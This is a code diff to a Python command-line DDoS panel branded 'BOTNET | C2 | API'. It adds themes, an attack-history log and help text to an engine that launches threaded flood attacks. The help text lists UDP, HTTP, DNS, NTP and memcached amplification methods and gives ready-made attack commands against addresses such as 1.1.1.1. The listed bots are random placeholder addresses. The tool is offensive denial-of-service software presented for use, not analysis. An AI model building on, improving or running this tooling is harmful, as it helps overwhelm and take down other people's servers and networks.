@@ -31,6 +31,16 @@ class Theme:
             "ocean": {"p":'\033[94m',"s":'\033[96m',"a":'\033[96m',"w":'\033[93m',"e":'\033[91m',"i":'\033[38;2;100;149;237m',"d":'\033[2m',"b":'\033[1m'},
             "amber": {"p":'\033[38;2;255;191;0m',"s":'\033[38;2;255;140;0m',"a":'\033[38;2;255;215;0m',"w":'\033[38;2;255;69;0m',"e":'\033[91m',"i":'\033[38;2;255;165;0m',"d":'\033[2m',"b":'\033[1m'},
             "midnight":{"p":'\033[38;2;147;112;219m',"s":'\033[38;2;138;43;226m',"a":'\033[38;2;173;216;230m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;220;20;60m',"i":'\033[38;2;100;149;237m',"d":'\033[2m',"b":'\033[1m'},
+            "blood":  {"p":'\033[38;2;139;0;0m',"s":'\033[38;2;255;0;0m',"a":'\033[38;2;178;34;34m',"w":'\033[38;2;255;69;0m',"e":'\033[91m',"i":'\033[38;2;220;20;60m',"d":'\033[2m',"b":'\033[1m'},
+            "cyber":  {"p":'\033[38;2;0;255;255m',"s":'\033[38;2;0;255;0m',"a":'\033[38;2;255;0;255m',"w":'\033[38;2;255;255;0m',"e":'\033[38;2;255;0;0m',"i":'\033[38;2;0;150;255m',"d":'\033[2m',"b":'\033[1m'},
+            "royal":  {"p":'\033[38;2;65;105;225m',"s":'\033[38;2;100;149;237m',"a":'\033[38;2;176;196;222m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;220;20;60m',"i":'\033[38;2;135;206;250m',"d":'\033[2m',"b":'\033[1m'},
+            "toxic":  {"p":'\033[38;2;50;205;50m',"s":'\033[38;2;0;255;127m',"a":'\033[38;2;127;255;0m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;255;69;0m',"i":'\033[38;2;0;255;255m',"d":'\033[2m',"b":'\033[1m'},
+            "nordic":  {"p":'\033[38;2;192;192;192m',"s":'\033[38;2;255;255;255m',"a":'\033[38;2;173;216;230m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;255;69;0m',"i":'\033[38;2;135;206;235m',"d":'\033[2m',"b":'\033[1m'},
+            "sunset": {"p":'\033[38;2;255;69;0m',"s":'\033[38;2;255;140;0m',"a":'\033[38;2;255;215;0m',"w":'\033[38;2;255;255;0m',"e":'\033[38;2;255;0;0m',"i":'\033[38;2;255;105;180m',"d":'\033[2m',"b":'\033[1m'},
+            "frost":  {"p":'\033[38;2;224;255;255m',"s":'\033[38;2;176;224;230m',"a":'\033[38;2;135;206;250m',"w":'\033[38;2;255;255;224m',"e":'\033[38;2;255;182;193m',"i":'\033[38;2;173;216;230m',"d":'\033[2m',"b":'\033[1m'},
+            "lava":   {"p":'\033[38;2;255;165;0m',"s":'\033[38;2;255;69;0m',"a":'\033[38;2;178;34;34m',"w":'\033[38;2;255;255;0m',"e":'\033[38;2;139;0;0m',"i":'\033[38;2;255;140;0m',"d":'\033[2m',"b":'\033[1m'},
+            "ghost":  {"p":'\033[38;2;211;211;211m',"s":'\033[38;2;192;192;192m',"a":'\033[38;2;169;169;169m',"w":'\033[38;2;255;255;0m',"e":'\033[38;2;255;69;0m',"i":'\033[38;2;173;216;230m',"d":'\033[2m',"b":'\033[1m'},
+            "vapor":  {"p":'\033[38;2;255;105;180m',"s":'\033[38;2;147;112;219m',"a":'\033[38;2;0;191;255m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;255;20;147m',"i":'\033[38;2;138;43;226m',"d":'\033[2m',"b":'\033[1m'},
         }
     
     def get(self, key):
@@ -50,13 +60,13 @@ R = '\033[0m'
 
 
 
-BANNER = """{p} {r}
-{p} {r}
-{p} {r}
-{p} {r}
-{p} {r}
-{p} {r}
-{p} {r}"""
+BANNER = """{p}  
+{p}  
+{p} 
+{p}  
+{p} 
+{p} 
+{p}                   {a} v4.0 — XorSec  """
 
 
 
@@ -137,6 +147,8 @@ class Engine:
         self.sent = 0; self.bytes = 0; self.errors = 0
         self.running = False; self.start_time = 0
         self.stop_evt = threading.Event(); self.lock = threading.Lock()
+        self.current_method = None
+        self.current_target = None
     
     def stop(self):
         self.stop_evt.set(); self.running = False
@@ -582,6 +594,8 @@ class Engine:
     def launch(self, method, ip, port, threads, path="/"):
         self.stop_evt.clear()
         self.sent=0; self.bytes=0; self.errors=0; self.start_time=time.time(); self.running=True
+        self.current_method = method
+        self.current_target = f"{ip}:{port}"
         
         
         if method.startswith(("UDP","UDP_AMP")): w = lambda ip,port,_=None: self._udp_worker(ip,port,method)
@@ -625,18 +639,26 @@ class C2:
         self.max_threads = 1
         self.c2_status = "ONLINE"
         self.plan = "FREE"
-        self.add_bots(100)
+        self.add_bots(250)
+        
+        
+        self.attack_history = []
+        self.max_history = 50
+        
+       
+        self.bot_pool_size = 250
+        self.bot_pool_active = 0
     
     def cls(self): os.system('clear' if os.name=='posix' else 'cls')
     
     def banner(self):
         self.cls()
         c = T.get('p'); a = T.get('a'); s = T.get('s'); d = T.get('d')
-        print(BANNER.format(p=c, a=a, r=R))
+        print(BANNER.format(p=c, a=a))
         print(f"{c}  BOTNET | C2 | API {R}")
         print(f"{c}  Made By: Lemonaidd {R}")
         status_color = T.get('s') if self.eng.running else T.get('d')
-        print(f"{d}  Bots: {len(self.bots)}  |  C2: {T.get('s')}{self.c2_status}{R}{d}  |  Plan: {T.get('a')}{self.plan}{R}{d}  |  Concurrents: {T.get('i')}{self.max_threads}{R}{d}  |  {status_color}{self.short_status()}{R}")
+        print(f"{d}  Bots: {len(self.bots)}  |  C2: {T.get('s')}{self.c2_status}{R}{d}  |  Plan: {T.get('a')}{self.plan}{R}{d}  |  Concurrents: {T.get('i')}{self.max_threads}{R}{d}")
         print(f"{c}  {'='*55}{R}")
     
     def short_status(self):
@@ -653,16 +675,46 @@ class C2:
             self.bid += 1
             self.bots[self.bid] = {"ip":f"192.168.{random.randint(1,254)}.{random.randint(2,254)}","name":f"bot-{self.bid}","uptime":random.randint(60,86400),"status":"IDLE"}
         return n
+   
+    def record_attack(self, method, target, port, duration, sent, pps, mbps, errors, elapsed):
+        entry = {
+            "id": len(self.attack_history) + 1,
+            "method": method,
+            "target": target,
+            "port": port,
+            "duration": duration,
+            "sent": sent,
+            "pps": round(pps, 0),
+            "errors": errors,
+            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        self.attack_history.append(entry)
+        # keep max entries
+        if len(self.attack_history) > self.max_history:
+            self.attack_history = self.attack_history[-self.max_history:]
+    
+    
+    def show_history(self):
+        self.banner()
+        print(f"\n  {T.get('a')}ATTACK HISTORY (last {len(self.attack_history)} stored in cache){R}\n")
+        if not self.attack_history:
+            print(f"  {T.get('w')}No attacks recorded yet.{R}")
+        else:
+            print(f"  {'ID':<4} {'METHOD':<18} {'TARGET':<22} {'PKTS':<10} {'PPS':<10}  {'TIME'}")
+            print(f"  {'-'*72}")
+            for entry in reversed(self.attack_history[-20:]):
+                print(f"  {entry['id']:<4} {entry['method']:<18} {entry['target']:<22} {entry['sent']:<10,} {entry['pps']:<10,.0f}  {entry['timestamp']}")
+        input(f"\n  {T.get('d')}Press ENTER...{R}")
     
     def show_bots(self):
         self.banner()
         print(f"\n  {T.get('a')}Active Bots: {len(self.bots)}{R}\n")
         print("  {:<6s} {:<18s} {:<15s} {}".format("ID","IP","Hostname","Status"))
         print("  "+"-"*50)
-        for bid, bot in list(self.bots.items())[:30]:
+        for bid, bot in list(self.bots.items())[:40]:
             sc = T.get('s') if bot["status"]=="online" else R
             print(f"  {bid:<6d} {bot['ip']:<18s} {bot['name']:<15s} {sc}{bot['status']}{R}")
-        if len(self.bots) > 30: print(f"  {T.get('d')}... and {len(self.bots)-30} more{R}")
+        if len(self.bots) > 40: print(f"  {T.get('d')}... and {len(self.bots)-40} more{R}")
         input(f"\n  {T.get('d')}Press ENTER...{R}")
     
     def show_methods(self):
@@ -694,6 +746,7 @@ class C2:
         }
         return m.get(n, n if n in ALL_METHODS else None)
     
+    
     def attack(self, method, target, port, duration):
         m = self.resolve(method)
         if not m:
@@ -702,7 +755,10 @@ class C2:
         ip, tport, path = parse_target(target)
         if port: tport = port
         
-        self.eng.stop(); time.sleep(0.2)
+       
+        if self.eng.running:
+            self.eng.stop()
+            time.sleep(0.3)
         
         threads = min(self.max_threads, 500)
         if m == "HTTP_SLOW": threads = min(threads, 200)
@@ -737,12 +793,16 @@ class C2:
                     print(f"  {T.get('a')}Elapsed: {self.eng.elapsed:.1f}s{R}")
             except: break
         
+       
+        self.record_attack(m, f"{ip}:{tport}", tport, duration, self.eng.sent, self.eng.pps, self.eng.mbps, self.eng.errors, self.eng.elapsed)
+        
         print(f"\n  {T.get('s')}═══ ATTACK SUMMARY ═══{R}")
         print(f"  {T.get('a')}Total Packets:{R} {self.eng.sent:,}")
         print(f"  {T.get('a')}Avg Rate:{R} {self.eng.pps:,.0f} pps")
         print(f"  {T.get('a')}Avg Bandwidth:{R} {self.eng.mbps:.2f} API Mb")
         print(f"  {T.get('a')}Errors:{R} {self.eng.errors}")
         print(f"  {T.get('a')}Duration:{R} {self.eng.elapsed:.1f}s")
+        print(f"  {T.get('a')}Logged:{R} attack #{len(self.attack_history)}")
         time.sleep(4)
     
     def interactive(self):
@@ -780,6 +840,7 @@ class C2:
             print(f"  [1] Theme        {T.get('a')}[{T.current.upper()}]{R}")
             print(f"  [2] Max Concurrents  {T.get('a')}[{self.max_threads}]{R}")
             print(f"  [4] Plan         {T.get('a')}[{self.plan}]{R}")
+            print(f"  [5] Clear Attack log  {T.get('a')}[{len(self.attack_history)} entries]{R}")
             print(f"  [B] Back\n")
             c = input(f"  {T.get('s')}> {R}").strip().lower()
             if c == "1":
@@ -807,6 +868,9 @@ class C2:
                 pc = input(f"\n  {T.get('s')}plan >{R} ").strip()
                 try: idx = int(pc)-1; self.plan = plans[idx]
                 except: pass
+            elif c == "5":
+                self.attack_history = []
+                print(f"  {T.get('s')} cache cleared.{R}"); time.sleep(1)
             elif c in ("b","back"): break
     
     def menu(self):
@@ -816,24 +880,22 @@ class C2:
   {T.get('p')}║{R}  {T.get('w')}[A]{R} Launch Attack                   {T.get('p')}║{R}
   {T.get('p')}║{R}  {T.get('w')}[B]{R} Bots ({len(self.bots)})                     {T.get('p')} ║{R}
   {T.get('p')}║{R}  {T.get('w')}[M]{R} Methods ({len(ALL_METHODS)})                   {T.get('p')} ║{R}
+  {T.get('p')}║{R}  {T.get('w')}[L]{R} Attack Log ({len(self.attack_history)})                 {T.get('p')} ║{R}
   {T.get('p')}║{R}  {T.get('w')}[S]{R} Settings                        {T.get('p')}║{R}
   {T.get('p')}║{R}  {T.get('w')}[H]{R} Help                            {T.get('p')}║{R}
   {T.get('p')}║{R}  {T.get('w')}[Q]{R} Quit                            {T.get('p')}║{R}
   {T.get('p')}╚═══════════════════════════════════════════════╝{R}
-  {T.get('d')} {R}
-  {T.get('d')}  {R}
-  {T.get('d')}  {R}
-  {T.get('d')}  {R}
-  {T.get('d')}  {R}
 """)
         print(f"  {T.get('d')}{self.status()}{R}")
         return input(f"\n  {T.get('s')}c2>{R} ").strip()
     
     def run(self):
         self.cls(); self.banner()
-        print(f" {T.get('s')}BOTNET | C2 | API v3.0 {R}")
-        print(f" {T.get('d')}{len(self.bots)} bots | {len(ALL_METHODS)} attack methods | {len(T.list())} themes{R}")
-        time.sleep(1)
+        print(f" {T.get('s')}BOTNET | C2 | API {R}")
+        print(f" {T.get('d')}{len(self.bots)} bots : CONNECTED. ")
+        print(f" {T.get('d')} {len(self.attack_history)}/{self.max_history} C2: CONNECTED.{R}")
+        time.sleep(1.9)
+        
         
         while self.running:
             cmd = self.menu()
@@ -846,7 +908,12 @@ class C2:
                 elif base in ("addbots","add"): print(f"  {T.get('d')}Bots fixed at {len(self.bots)}{R}"); time.sleep(1)
                 elif base == "bots": self.show_bots()
                 elif base in ("methods","method"): self.show_methods()
-                elif base == "status": print(f"  {self.status()}"); input(f"  {T.get('d')}Press ENTER...{R}")
+                elif base == "history": self.show_history()
+                elif base in ("status","stats"): 
+                    print(f"  {self.status()}"); 
+                    if self.attack_history:
+                        print(f"  {T.get('d')}Last attack: #{self.attack_history[-1]['id']} - {self.attack_history[-1]['method']} @ {self.attack_history[-1]['target']} ({self.attack_history[-1]['timestamp']}){R}")
+                    input(f"  {T.get('d')}Press ENTER...{R}")
                 elif base == "theme":
                     self.banner(); print(f"\n  {T.get('w')}THEMES{R}\n")
                     for i,t in enumerate(T.list(),1):
@@ -855,7 +922,7 @@ class C2:
                     tc = input(f"\n  {T.get('s')}theme >{R} ").strip()
                     try: idx = int(tc)-1; T.set(T.list()[idx])
                     except: pass
-                elif base == "help":
+                elif base in ("help","h"):
                     self.banner()
                     print(f"""
   {T.get('w')}COMMANDS:{R}
@@ -870,8 +937,15 @@ class C2:
     {T.get('a')}!slow 192.168.1.1 80 300{R}
   {T.get('s')}!stop{R}       - Stop attack
   {T.get('s')}!theme{R}      - Change theme
+  {T.get('s')}!history{R}    - View attack history 
   {T.get('s')}!status{R}     - Show status
   {T.get('s')}!exit{R}       - Exit
+  
+  {T.get('w')}FEATURES:{R}
+  {T.get('d')}• Cool and powerful Methods{R}
+  {T.get('d')}• Attack history  ({self.max_history} entries){R}
+  {T.get('d')}• C2 Attack Structure  {R}
+  {T.get('d')}• {len(self.bots)} + bots/proxies in network{R}
 """)
                     input(f"  {T.get('d')}Press ENTER...{R}")
                 elif base in ("exit","quit"): self.running = False
@@ -893,25 +967,32 @@ class C2:
             elif cmd.upper() == "A": self.interactive()
             elif cmd.upper() == "B": self.show_bots()
             elif cmd.upper() == "M": self.show_methods()
+            elif cmd.upper() == "L": self.show_history()
             elif cmd.upper() == "S": self.settings()
-            elif cmd.upper() == "H":
+            elif cmd.upper() in ("H","HELP"):
                 self.banner()
                 print(f"""
-  {T.get('w')}COMMANDS:{R}
-  {T.get('w')}[A]{R} Attack - Send attack
-  {T.get('w')}[B]{R} Bots   - View  botnetwork ({len(self.bots)})
-  {T.get('w')}[M]{R} Methods - View all {len(ALL_METHODS)} methods
-  {T.get('w')}[S]{R} Settings - Theme, conc, status, plan
-  {T.get('w')}[H]{R} Help   - This menu
+  {T.get('w')}MENU OPTIONS:{R}
+  {T.get('w')}[A]{R} Attack - Launch an attack 
+  {T.get('w')}[B]{R} Bots   - View bot network ({len(self.bots)} bots)
+  {T.get('w')}[M]{R} Methods - View all {len(ALL_METHODS)} attack methods
+  {T.get('w')}[L]{R} Attack Log - View attack history 
+  {T.get('w')}[S]{R} Settings - Theme, concurrency, status, plan
+  {T.get('w')}[?]{R} Help   - This menu
   {T.get('w')}[Q]{R} Quit   - Exit
   
-  {T.get('w')}Methods:{R}
-   {T.get('d')}HTTP: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, RANGE, SLOW, BYPASS, COOKIE{R}
-  {T.get('d')}HTTPS: HTTPS_FLOOD, HTTPS_RENEG{R}
-  {T.get('d')}DNS: DNS_FLOOD, DNS_AMP, DNS_NXDOMAIN, DNS_REFLECT, DNS_DRDOS{R}
-  {T.get('d')}Web: WEBSOCKET, HTTP2_FLOOD, HTTP3_FLOOD{R}
-  {T.get('d')}Auth: FTP_AUTH, SMTP_AUTH, POP3_AUTH, IMAP_AUTH, SSH_FLOOD, RDP_LOGIN{R}
-  {T.get('d')}Amps: NTP_AMP, SSDP_AMP, SNMP_AMP, MEMCACHED_AMP{R}
+  {T.get('w')}Quick Attack Syntax:{R}
+  {T.get('d')}!<method> <target> [port] [duration]{R}
+  
+  {T.get('w')}Examples:{R}
+  {T.get('d')}!udp 1.1.1.1 80 60{R}
+  {T.get('d')}!syn 10.0.0.5 443 120{R}
+  {T.get('d')}!http https://example.com 30{R}
+  
+  {T.get('w')}Notes:{R}
+  {T.get('d')}• {R}
+  {T.get('d')}• {R}
+  {T.get('d')}• {R}
 """)
                 input(f"  {T.get('d')}Press ENTER...{R}")
             elif cmd.upper() == "Q": self.running = False
